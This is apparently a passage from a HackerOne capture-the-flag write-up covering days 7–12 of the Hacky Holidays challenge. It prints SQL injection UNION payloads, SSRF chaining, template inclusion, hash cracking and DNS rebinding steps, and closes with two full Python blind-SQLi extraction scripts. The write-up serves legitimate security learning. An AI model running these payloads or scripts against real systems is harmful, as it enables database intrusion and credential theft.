\\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ\n :: Wordlist         : FUZZ: common_webcontent.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\nnew                     [Status: 200, Size: 2494, Words: 440, Lines: 49]9] :: Errors: 0 ::\ntemplates               [Status: 302, Size: 0, Words: 1, Lines: 1]0:01:40] :: Errors: 0 ::\n:: Progress: [4661/4661] :: Job [1/1] :: 41 req/sec :: Duration: [0:01:56] :: Errors: 0 ::\n```\n\nAnd yes we did! Let's navigate to `/templates` and see what we got:\n\n{F1139691}\n\nGreat! We found the location of the template files! The file `38dhs_admins_only_header.html` seems very interesting! Unfortunately, we can't open any of the files directly from the browser:\n\n{F1139684}\n\nBut let's just include the file, using the following syntax in our own mail template:\n\n`{{template:38dhs_admins_only_header.html}}`\n\nAnd preview it:\n\n```\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Wed, 30 Dec 2020 13:04:33 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nContent-Length: 64\n\nYou do not have access to the file 38dhs_admins_only_header.html\n```\n\nWell, that's not good... Time to try harder like a true 1337 hacker! Remember how we discovered earlier that we can provide our own data to be used in the preview generation? What happens if the value of a variable is set to the syntax of including a file? The idea would be as follows:\n\n`preview_markup={{hihi}}\u0026preview_data={\"hihi\":\"{{template:38dhs_admins_only_header.html}}\"}`\n\nThe variable 'hihi' is replaced with the specified value:\n\n`{{hihi}} -\u003e {{template:38dhs_admins_only_header.html}}`\n\nWe cross our fingers and hope magic happens:\n\n`{{template:38dhs_admins_only_header.html}} -\u003e plz give me flag`\n\n{F1139687}\n\nAwesome! Our idea worked! We successfully got the 7th flag and are one step closer to take down the Grinch Networks\n\n`flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`\n\n## Day 8\n\nIt's a brand new day and I'm wondering if there could possibly be a new challenge... Well, what a surprise! A new challenge has been added called 'Forum'. We're informed that the Grinch keeps his best post in the admin section, but that we need a valid login to access that. Starting the challenge we can see a basic forum. Our actions however are very limited since we're not logged in, so let's work on that! Once again let's give FFUF a shot with one of our favorites, 'common.txt':\n\n```\nffuf -w common_webcontent.txt -t 5 -u \"https://hackyholidays.h1ctf.com/forum/FUZZ\"\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.2.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/forum/FUZZ\n :: Wordlist         : FUZZ: common_webcontent.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 5\n :: Matcher          : Response status: 200,204,301,302,307,401,403\n________________________________________________\n\n1                       [Status: 200, Size: 2249, Words: 788, Lines: 64] :: Errors: 0 ::\n2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]] :: Errors: 0 ::\nlogin                   [Status: 200, Size: 1569, Words: 396, Lines: 34]1] :: Errors: 0 ::\nphpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]5] :: Errors: 0 ::\n:: Progress: [4661/4661] :: Job [1/1] :: 41 req/sec :: Duration: [0:01:54] :: Errors: 0 ::\n```\n\n`/phpmyadmin` seems interesting!\n\n{F1139698}\n\nHmm, it appears to be a totally legit original phpMyAdmin login page. But what now? Trying to brute-force the login page on both `/login` and `/phpmyadmin` doesn't seem feasible, believe me, I tried. If only we knew more about how the forum works... If only there were some way we could view the source code... If only there existed a common place where a lot of people store their code online for anyone to view... If only I could get a sweet brand new unlimited Burp Suite Professional license for Christmas this year... I think I lost the thread there. But what about GitHub?? While it probably can't give me that license, it might be able to give me the source code for the forum! Let's check Adam Langley's GitHub\n\n{F1139696}\n\nBingo! We discovered a Git Repository containing the source code of the Forum! We can see that 4 commits have been made. Time to dig into the code and see what we can find. The commit called 'Initial Code Commit' seems interesting. And look at that:\n\n{F1139695}\n\nLooks like we just found some database credentials! Let's test them on `/phpmyadmin`:\n\n{F1139693}\n\nThey worked! We now have access to the database! The 'user' table looks interesting. We can see that there exist two users on the forum: 'grinch' and 'max'. We can also see their passwords but in an encrypted form. Let's see if we can crack the password for the user 'grinch'. Before we go crazy with hashcat, let's quickly see if we're lucky enough that crackstation.net does the job for us:\n\n{F1139692}\n\nLook at that! It actually did work! We've successfully cracked the password and can now log in on the forum:\n\n{F1139694}\n\nGreat! We got access to the admin section and have successfully got the 8th flag!\n\n`flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`\n\n## Day 9\n\nFeeling in the mood for a quiz today, it's a pleasant surprise to see that the Grinch has provided us with a quiz as the next challenge, 'Evil Quiz'\n\n{F1139703}\n\nUpon completing the quiz, we're met with the following screen:\n\n{F1139702}\n\nThe feature that allows us to see how many players have the same name as us seems very interesting.\n\nBeing a 1337 hacker and seeing an input field, the next move seems obvious: Spraying the input field with every single just slightly good idea of a payload we can come up with.\n\n{F1139704}\n\nWell, that was definitely an interesting response! It seems safe to assume that there are not 1218510 other players with that exact name, so we've probably found an SQLi! Now comes the fun part, exploitation.\n\nLet's start by see if we can make a UNION attack. To do so, we need to figure out how many columns are returned by the original SQL query. This can be achieved by using the SELECT statement to select eg. an increasing number of integers.\n\n- `bla' UNION SELECT '1`\n- `bla' UNION SELECT 1,'2`\n- `bla' UNION SELECT 1,2,'3`\n- Etc.\n\nWe then need to look for the response. In this case, an error in the SQL query will result in a response stating that there are 0 other players with the same name as us, while a successful query will tell us that there's 1 other player with the same name. Let's start testing.\n\n{F1139705}\n\nWe now know that there are 4 columns and can go to the next step of our exploitation. The table `information_schema.tables` can be queried for existing tables in the database. A table with a name like 'admin' is probably a good guess. Let's test if there exist any tables called 'admin' with the following payload:\n\n`bla' UNION SELECT 1,2,3,4 from information_schema.tables WHERE table_name = 'admin`\n\n{F1139697}\n\nWe see that 1 other player has the same name as us, meaning that there indeed is a table with the name 'admin' and that our guess was correct!\n\nWe can now use the table `information_schema.columns` to figure out which columns exists in the 'admin' table. Let's check for a 'username' and 'password' column using these two payloads:\n\n`bla' UNION SELECT 1,2,3,4 from information_schema.columns WHERE table_name = 'admin' AND column_name = 'username`\n\n`bla' UNION SELECT 1,2,3,4 from information_schema.columns WHERE table_name = 'admin' AND column_name = 'password`\n\nBoth payloads result in the message telling us that 1 other player has the same name, meaning that there indeed exists both a 'username' column and 'password' column exists in the 'admin' table. Let's figure out how many users exist in this table by using the LIKE operator:\n\n`bla' UNION SELECT 1,2,3,4 from admin WHERE username LIKE '%`\n\n{F1139701}\n\nApparently, only one user exists in the admin table. What could the username possibly be..? Well, how about admin:\n\n`bla' UNION SELECT 1,2,3,4 from admin WHERE username = 'admin`\n\n{F1139699}\n\nYup, the one user in the 'admin' table's username is 'admin'. Now we just have to figure out what the user's password is. How hard can that be? Well, turns out it's actually a bit difficult. Since we're 1337 hackers and don't want to spend the rest of the night manually brute-forcing the password, we use our non-existing python skills to write a script that can do the job for us. The main idea of the script is to use the LIKE operator to brute-force the password one character at a time, with payloads in the following format:\n\n`bla' UNION SELECT 1,2,3,password FROM admin WHERE password LIKE BINARY('passwo%') OR 1='2`\n\nWe're using the BINARY function to make the query case-sensitive. Let's run our script go wrap some Christmas presents while we wait.\n\n```\npy day_9.py -c \"mysessioncookie\"\nPASSWORD: S\nPASSWORD: S3\nPASSWORD: S3c\nPASSWORD: S3cr\nPASSWORD: S3cre\nPASSWORD: S3creT\nPASSWORD: S3creT_\nPASSWORD: S3creT_p\nPASSWORD: S3creT_p4\nPASSWORD: S3creT_p4s\nPASSWORD: S3creT_p4ss\nPASSWORD: S3creT_p4ssw\nPASSWORD: S3creT_p4ssw0\nPASSWORD: S3creT_p4ssw0r\nPASSWORD: S3creT_p4ssw0rd\nPASSWORD: S3creT_p4ssw0rd-\nPASSWORD: S3creT_p4ssw0rd-$\nCouldn't find more chars. Final found is: S3creT_p4ssw0rd-$\n```\n\nYay, our script is done and has extracted the password, 'S3creT_p4ssw0rd-$', from the database! We can now login with the credentials:\n\n{F1139700}\n\n[Insert your favorite triumph interjection]! We solved the challenge and got the 9th flag! Time to go to bed.\n\n`flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`\n\n## Day 10\n\nTody the Grinch is recruiting for his army in the challenge 'Signup Manager'. Let's dive in and find the flag!\n\n{F1139708}\n\nThe challenge allows us to sign up for recruitment. Let's try that with some random info:\n\n{F1139710}\n\nHmm, that wasn't super interesting. Let's take a look at the source of the page:\n\n{F1139709}\n\n'README.md'! That sounds interesting! Let's try to navigate to `/README.md`. By doing so, we get the following file:\n\n```\n# SignUp Manager\n\nSignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.\n\n### How to Install\n\n1) Create a directory that you wish SignUp Manager to be installed into\n\n2) Move signupmanager.zip into the new directory and unzip it.\n\n3) For security move users.txt into a directory that cannot be read from website visitors\n\n4) Update index.php with the location of your users.txt file\n\n5) Edit the user and admin php files to display your hidden content\n\n6) You can make anyone an admin by changing the last character in the users.txt file to a Y\n\n7) Default login is admin / password\n```\n\nThe file mentions the zip folder 'signupmanager.zip', let's check if we're lucky enough that the zip file can be downloaded from the website.\n\n{F1139711}\n\nWe where! And the zip file contains the source code of the recruiter page as seen above! Time to dive into the source code. The file `index.php` is definitely the most interesting one.\n\nWhen signing up, all the info provided is concatenated to a string and stored in the 'users.txt' file. The 113th character determines whether or not a given user is an admin. If the 113 character is 'Y', the user is an admin or else not. The check to determine this is done in the following line from 'index.php':\n\n```PHP\n'admin' =\u003e ((substr($user_str, 112, 1) === 'Y') ? true : false)\n```\n\nOur goal appears to simply be to have the 113th char set to Y, so we become admins. Can't we just do something like provide a really long name ending with a 'Y' then? Well it isn't that simple sadly since the length of each input we give is controlled:\n\n- The username, first name, and last name is cut off to max 15 chars, eg.:\n\n```PHP\n$username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST[\"username\"]), 0, 15);\n```\n\n- The password is MD5 hashed, making it fixed at 32 chars\n\n```PHP\n$password = md5($_POST[\"password\"]);\n```\n\n- The length of the age must be 3 chars or less\n\n```PHP\nif (strlen($_POST[\"age\"]) \u003e 3) {\n    $errors[] = 'Age entered is too long';\n}\n```\n\nSo where is the weak link? Noticing the following line made my eyes widen:\n\n```PHP\n$age = intval($_POST[\"age\"]);\n```\n\nThis line comes **after** the initial length check. PHP has some interesting behavior when converting strings to Integers using `intval`. Scientific notation is eg. allowed, meaning that something like '3e2' will be converted to '9'. This is super interesting for us in this case since we can provide something as '9e9' which has a length of 3 chars, but will become some big number after being converted with `intval`: '9000000000'. A number that is longer than 3 chars.\n\nLet's take a look at how the input is concatenated:\n\n```PHP\nfunction addUser($username,$password,$age,$firstname,$lastname){\n    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date(\"U\").microtime().rand() );\n    $line = '';\n    $line .= str_pad( $username,15,\"#\");\n    $line .= $password;\n    $line .= $random_hash;\n    $line .= str_pad( $age,3,\"#\");\n    $line .= str_pad( $firstname,15,\"#\");\n    $line .= str_pad( $lastname,15,\"#\");\n    $line .= 'N';\n    $line = substr($line,0,113);\n    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);\n    return $random_hash;\n}\n```\n\nAs we can see, the user's last name is the last input in the concatenation meaning this is the input where we need to insert the 'Y' at the end. Normally the 15th char of the user's last name would be the 112th character of the concatenated string, one short of the magic 113th char which toggles whether or not the user is an admin. Let's make an exploit!\n\nThe idea is to make the age be 4 chars long after the `intval` conversion. We can then set the last char of the last name to 'Y' which will now be the 113th char since the length of the user's age has become one char longer than expected. A value such as '9e3' will do the job as the age since it'll become '9000' (4 chars) after conversion with `intval`. Let's see if our exploit works:\n\n{F1139706}\n\nLet's grab the cookie from the response and reload `/signup-manager` authenticated as our newly created user:\n\n{F1139707}\n\nI'm-really-running-out-of-new-ways-to-express-excitement! We got the 10th flag!!! Note that we also got a link to `/r3c0n_server_4fdk59` which is where we should continue our journey tomorrow.\n\n`flag{99309f0f-1752-44a5-af1e-a03e4150757d}`\n\n## Day 11\n\nChristmas is coming. We're getting close to the crucial day the Grinch is planning his DDoS attack against Santa. Let's start today's challenge to see what we are dealing with:\n\n{F1139830}\n\nIn today's challenge, we get informed that an API is currently being developed. Let's head over to `/api` to see if we find anything:\n\n{F1139712}\n\nWe get a nice description of the different responses we can expect from the API, let's try to find some endpoints! Hmm, that doesn't work out well. No matter what great guesses of endpoints we can come up with, we're met with the following error:\n\n`{\"error\":\"This endpoint cannot be visited from this IP address\"}`\n\nHmm, seems like we should take another path. The challenge also allows us to browse some photo albums on `/album`:\n\n{F1139714}\n\nLet's try to open up one of the photos in a new tab:\n\n{F1139852}\n\nHmm, the GET parameter `data` seems interesting. Let's Base64 decode it:\n\n```JSON\n{\n    \"image\":\"r3c0n_server_4fdk59\\/uploads\\/0a382c6177b04386e1a45ceeaa812e4e.jpg\",\n    \"auth\":\"ec5a9920e177ccc84974146f93ae04b0\"\n}\n```\n\nLooks like the server is kind enough to go fetch a file we've specified in the `image` parameter as long as we provide it along with a propper `auth` value. Maybe there's potential for some SSRF vulnerability here? Maybe we could get access to the API by querying it through this feature? Let's note that idea down before we continue.\n\nIt seems difficult to figure out how the value of the `auth` parameter is generated and after some testing, I decided to try to take a different path. Let's go back to the `/album` page.\n\nThe albums seem to be returned based on the value of the GET parameter `hash`. Let's do some testing on this parameter.\n\nMost values result in a 404, but take a look at this:\n\n{F1139843}\n\nLooks like we just found an SQLi! Let's try to do a UNION attack. This caused me a headache. It didn't seem to work no matter the number of columns I tried to match. But finally, I found a working payload:\n\n```SQL\na' UNION SELECT 1,2,3-- -\n```\n\n{F1139847}\n\nThe problem turned out to be that I couldn't provide a valid hash and do the UNION attack. Instead, I had to provide something invalid such as 'a'. Hmm, that's weird. What could the context of this SQLi be? What does the full SQL query look like?\n\nAfter exploring the database we can conclude that there doesn't seem to be any interesting information. The only two tables appear to be 'album' and 'photo' which doesn't contain anything interesting.\n\nThe weird behavior of the SQLi still puzzles me. Let's see if we can get a better understanding of the SQL query we're injecting our payload into. After some googling, I discovered that the table `information_schema.processlist` can be queried to get information on the current SQL query being executed. Let's use that to see what the current query looks like:\n\n```SQL\na'UNION SELECT 1,2,info from information_schema.processlist-- -\n```\n\n{F1139846}\n\nHmm, that's weird. The original SQL query appears to simply be:\n\n```SQL\nSELECT * FROM album WHERE hash = 'INPUT'\n```\n\nHow can such a simple query result in this weird behavior? And how can that query alone return the correct photos? The photos aren't even referenced in the 'album' table. They are only being referenced in the 'photo' table... Wait... Maybe there is more going on here. What if it's actually a dream within a dream within... Whoops, wrong train of thought. Let me try again: What if it's actually a SQL query within a SQL query? Also known as a subquery. Maybe the 'parent' query looks something like this:\n\n```SQL\nSELECT * FROM photo WHERE something = (SELECT * FROM album WHERE hash = 'INPUT')\n```\n\nMaybe we can do an SQLi within an SQli? Let's start by figuring out which of the columns affect the photos being loaded. Let's start by providing some gibberish string as the first:\n\n```SQL\na'UNION SELECT \"hihi\",2,3-- -\n```\n\n{F1139845}\n\nWell, the photos are gone. It seems like the value of the first column affects which photos are loaded.\n\nNow let's try to actually do an SQLi within an SQLi:\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,3-- -\",2,3-- -\n```\n\n{F1139844}\n\nIt looks like a photo is attempted to be displayed. Let's open it up in a new tab:\n\n{F1139850}\n\nExciting! Let's try and Base64 decode the `data` parameter for the photo:\n\n```JSON\n{\n    \"image\":\"r3c0n_server_4fdk59\\/uploads\\/3\",\n    \"auth\":\"fea7507478aa8225c022527b1763fb33\"\n}\n```\n\nYes! Notice the '3'? We successfully got the server to generate a valid `auth` value based on our input! Let's try to swap the '3' for the value '../api':\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,'../api'-- -\",2,3-- -\n```\n\n{F1139851}\n\n'Invalid content type detected' - sounds like we successfully made the server request an existing resource! The API endpoint! Let's check the Base64 decoded `data` value:\n\n```JSON\n{\n    \"image\":\"r3c0n_server_4fdk59\\/uploads\\/..\\/api\",\n    \"auth\":\"38122d477657c1a0c9ba873c11017497\"\n}\n```\n\nPerfect! We've successfully made the server request `r3c0n_server_4fdk59/api` for us! Let's now create a script to fuzz for valid API endpoints.\n\n```\npy day_11.py -p \"api/BRUZZ\" -w \"common-api-endpoints-mazen160.txt\" -f 404\nFOUND: ping\nFOUND: user\n100%|█████████████████████████████████████████████████████████████████████████████████████████████████████| 174/174 [02:30\u003c00:00,  1.16it/s]\n```\n\nOur script found two endpoints! `api/ping` and `api/user`. `api/ping` turned out to be a red herring (thanks Adam...) so I'll spare you the confusion and move on to the second found: `api/user`. Let's check which response we get for this endpoint:\n\n{F1139848}\n\nHmm, that's a bit disappointing... Pretty frustrating to know that some response body is returned but we can't view it... After trying to circumvent this problem without succeeding I decided to take a different path. Maybe there's more fuzzing to do? Looking at the list of different response codes we got listed on `r3c0n_server_4fdk59/api` it seems like we might have more to discover.\n\n{F1139716}\n\nThis seems like a pretty interesting feature. Maybe there are some GET parameters to be found on `api/user`? Let's try providing some random GET parameter as a test:\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,'../api/user?bla=hihi'-- -\",2,3-- -\n```\n\n{F1139715}\n\nYup, as expected we got a 400 response. We could now start our fuzzing script up again, but before doing that, we could try and use our 1337 hacking brains to make some qualified guesses.\n\nOne thing I haven't mentioned yet is the link to `/attack-box` this challenge provides us with on the front page. `/attack-box` appears to be the next challenge, but we're faced with a login form we need to submit to access `/attack-box`.\n\nWith this in mind and having an idea of where this challenge is going and knowing that our API endpoint is called `user`, something as 'username' and 'password' seems like pretty good guesses. Let's try them:\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,'../api/user?username=bla%26password=hihi'-- -\",2,3-- -\n```\n\n{F1139713}\n\nBingo! Seems like we just found two valid GET parameters using our 1337 guessing skills! Now we just need to figure out the correct credentials to provide. But how? It seems safe to assume that we're interfering with the database when providing the credentials. If only there existed some way to provide a wildcard in SQL... Well, what about the '%' char? Let's try that:\n\n```SQL\na'UNION SELECT \"' UNION SELECT 1,2,'../api/user?username=%%26password=%'-- -\",2,3-- -\n```\n\n{F1139842}\n\nOkay-seriously-can-someone-provide-me-with-a-list-of-exclamations! Seems like the '%' works as a wildcard since we didn't get the 204 response, but instead an 'Invalid content type detected' meaning some data was attempted to be returned. Time to modify our script a bit and fire it up in brute-force mode:\n\n```\npy day_11.py -u \"api/user?username=BRUZZ%\" -b -f 204\nNEW CHAR FOUND: g\nNEW CHAR FOUND: gr\nNEW CHAR FOUND: gri\nNEW CHAR FOUND: grin\nNEW CHAR FOUND: grinc\nNEW CHAR FOUND: grinch\nNEW CHAR FOUND: grincha\nNEW CHAR FOUND: grinchad\nNEW CHAR FOUND: grinchadm\nNEW CHAR FOUND: grinchadmi\nNEW CHAR FOUND: grinchadmin\nCouldn't find more chars. Final found is: grinchadmin\n```\n\nCool, we successfully brute-forced the username: 'grinchadmin'. Time for the password:\n\n```\npy day_11.py -u \"api/user?password=BRUZZ%\" -b -f 204\nNEW CHAR FOUND: s\nNEW CHAR FOUND: s4\nNEW CHAR FOUND: s4n\nNEW CHAR FOUND: s4nt\nNEW CHAR FOUND: s4nt4\nNEW CHAR FOUND: s4nt4s\nNEW CHAR FOUND: s4nt4su\nNEW CHAR FOUND: s4nt4suc\nNEW CHAR FOUND: s4nt4suck\nNEW CHAR FOUND: s4nt4sucks\nCouldn't find more chars. Final found is: s4nt4sucks\n```\n\nEvax(Latin, duh)! We also got the password now! (Thanks so much for not doing some case-sensitive stuff Adam)\nLet's try our credentials on `/attack-box/login`:\n\n{F1139849}\n\nFINALLY! That was a tough challenge, but we did it! We finally got the 11th flag and access to `/attack-box` let's try to sleep a few hours before the night is over and come back tomorrow.\n\n`flag{07a03135-9778-4dee-a83c-7ec330728e72}`\n\n## Day 12\n\nChestnuts roasting on an open fire, the Grinch is DDoSing Santa Clause ♫\n\nWait, what? We better get to work to save Christmas! Navigating to `/attack-box` we see that the page has been updated:\n\n{F1139836}\n\nIt looks like the Grinch has launched a DDoS attack against Santa's severs! Just as the hidden event from day 6 said. Clicking one of the 'attack' buttons, we see the following screen:\n\n{F1139837}\n\nRight before ending at the screen, we see a request was made to `/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`. Let's try to Base64 decode the `payload` parameter:\n\n```JSON\n{\n    \"target\":\"203.0.113.33\",\n    \"hash\":\"5f2940d65ca4140cc18d0878bc398955\"\n}\n```\n\nHmm, looks like this request is used to launch a DDoS attack against the target specified in the `target` parameter. Maybe we could trick the server into launching a DDoS attack against itself? Let's note that idea down and continue.\n\nSadly, we can't just modify the `target` parameter without providing a matching `hash`. Trying to do so gives us the following error:\n\n`Invalid Protection Hash`\n\nAfter browsing around the challenge I decided to go full beast mode and see if we could crack the hash. It looks like it's an MD5 hash. Maybe a salt is used with the `target` value to generate the hash? Let's use `rockyou.txt` with hashcat to see if that's the case. Let's start by testing for `salt.pass`:\n\n```\nhashcat.exe -m 20 \"5f2940d65ca4140cc18d0878bc398955:203.0.113.33\" rockyou.txt --show\n5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463\n```\n\nWow! It actually worked! We got the salt: 'mrgrinch463'. Now let's just create our own Base64 encoded payload to launch an attack against `127.0.0.1` to end Grinch Netork once and for all:\n\n`md5(mrgrinch463127.0.0.1) -\u003e 3e3f8df1658372edf0214e202acb460b`\n\n```JSON\n{\n    \"target\":\"127.0.0.1\",\n    \"hash\":\"3e3f8df1658372edf0214e202acb460b\"\n}\n```\n\n{F1139835}\n\nEhhh... So that didn't work. The sneaky Grinch has set up some protection to avoid an attack against a local target. Dammit. After trying some different bypass techniques I was about to give up on Christmas this year, but then a final idea popped up. What about DNS rebinding? Could we maybe set up a host that first resolves to one of the Santa target servers and then to '127.0.0.1'? The idea is that when the check is made to make sure the target isn't local, our host resolves to a Santa target which will pass the check. When the attack is then launched, our host resolves to '127.0.0.1' instead, resulting in an attack against the Grinch Networks! Let's try this! We can use this online tool: https://lock.cmpxchg8b.com/rebinder.html to generate a hostname for the purpose (shout-out to @rekter0 for showing me this tool)\n\n{F1139838}\n\nIt looks promising.\n\n{F1139839}\n\nWuhuu! We did it! We solved the 12 and last challenge, took down the Grinch Network, and saved Christmas! Thanks for following along! You can relax and enjoy the holidays now well assured that the Grinch won't spoil it.\n\n`flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`\n\n\n\n---\n## Scripts\n\n#### Day 9:\n```python\nimport argparse\nimport requests\nimport warnings\n\nwarnings.filterwarnings(\"ignore\")\n\nparser = argparse.ArgumentParser()\n\nparser.add_argument(\"-c\", \"--cookie\", help=\"provide a session cookie for a session where you've already completed the quiz\", required=True)\nargs = parser.parse_args()\n\ncharset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789%_;#$£}{[]\u0026.,!=+@()?-~*'\u003c\u003e\"\n\nurl = 'https://hackyholidays.h1ctf.com/evil-quiz'\n\ncookies = {'session': args.cookie}\n\npassword = \"\"\n\n\ndef brute():\n    global password\n    found_char = True\n    while found_char:\n        found_char = False\n        for c in charset:\n            if c in \"%_\": #Escaping MySQL wildcards\n                c = \"\\\\\"+c\n            body = {\"name\": \"bla' UNION SELECT 1,2,3,password FROM admin WHERE password LIKE BINARY('\"+password+c+\"%') OR 1='2\"}\n            response_1 = requests.post(url, data = body, cookies=cookies, verify=False)\n            if response_1.status_code == 200:\n                response_2 = requests.get(url+\"/score\", cookies=cookies, verify=False)\n                if \"There is 0 other player(s) with the same name as you!\" not in response_2.text:\n                    password+=c[-1] #Only take last char to avoid problems with escaped wildcards\n                    print(\"PASSWORD: \"+password)\n                    break\n            else:\n                print(\"Ehh, something went wrong. Got this status code: \"+response_1.status_code)\n                return\n    print(\"Couldn't find more chars. Final found is: \"+password)\n\nbrute()\n\n#Password: S3creT_p4ssw0rd-$\n```\n\n#### Day 11:\n```python\nimport sys\nimport requests\nimport warnings\nimport argparse\nfrom tqdm import tqdm\n\nwarnings.filterwarnings(\"ignore\")\n\nparser = argparse.ArgumentParser()\n\nparser.add_argument(\"-u\", \"--url\", help=\"provide a URL to request on /r3c0n_server_4fdk597/URL. Use 'BRUZZ' as the keyword\", required=True)\nparser.add_argument(\"-w\", \"--wordlist\", help=\"provide the path of the wordlist to use\")\nparser.add_argument(\"-f\", \"--filter\", help=\"provide a value to filter out responses based on. The value will be looked for in the response body\", required=True)\nparser.add_argument(\"-b\", \"--bruteforce\", help=\"bruteforce mode\", action=\"store_true\")\nargs = parser.parse_args()\n\nbase_url = 'https://hackyholidays.h1ctf.com'\nurl = args.url\nwordlist = args.wordlist\nresponse_filter = args.filter\n\ndef fuzz(lines):\n    for w in tqdm(lines):\n        fuzz_payload = url.replace(\"BRUZZ\", w.rstrip())\n        url1 = base_url+\"/r3c0n_server_4fdk59/album?hash=a'UNION  SELECT \\\"' UNION SELECT 1,2,'../\"+fuzz_payload+\"\\\",2,3-- -\"\n        response_1 = requests.get(url1, verify=False)\n        url2 = base_url+response_1.text[response_1.text.find(\"/r3c0n_server_4fdk59/picture?data=\"):].split(\"\\\"\")[0]\n        response_2 = requests.get(url2, verify=False)\n        if response_filter not in response_2.text:\n            tqdm.write(\"FOUND: \"+w.rstrip())\n\ndef brute(charset):\n    found_chars = \"\"\n    found_char = True\n    while found_char:\n        found_char = False\n        for c in charset:\n            brute_payload = url.replace(\"BRUZZ\", found_chars+c)\n            url1 = base_url+\"/r3c0n_server_4fdk59/album?hash=a'UNION  SELECT \\\"' UNION SELECT 1,2,'../\"+brute_payload+\"\\\",2,3-- -\"\n            response_1 = requests.get(url1, verify=False)\n            url2 = base_url+response_1.text[response_1.text.find(\"/r3c0n_server_4fdk59/picture?data=\"):].split(\"\\\"\")[0]\n            response_2 = requests.get(url2, verify=False)\n            if response_filter not in response_2.text:\n                found_char = True\n                found_chars += c\n                print(\"NEW CHAR FOUND: \"+found_chars)\n                break\n    print(\"Couldn't find more chars. Final found is: \"+found_chars)\n\nif args.bruteforce is not None:\n    charset = \"abcdefghijklmnopqrstuvwxyz0123456789\"\n    brute(charset)\nelif args.wordlist is not None:\n    try:\n        file1 = open(wordlist, 'r') \n        lines = file1.readlines() \n    except:\n        print(\"Couldn't find wordlist: \"+wordlist)\n        quit()\n    fuzz(lines)\nelse:\n    print(\"You must either specify a wordlist (-w) or user bruteforce mode (-b)\")\n    quit()\n```","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":587080,"username":"holme","name":"Lauritz Holme","bio":"","cleared":false,"website":null,"location":"Copenhagen","created_at":"2019-04-19T12:34:16.216Z","url":"https://hackerone.com/holme","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/oR64NYD1B7YVuyr3QEbru7tp/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}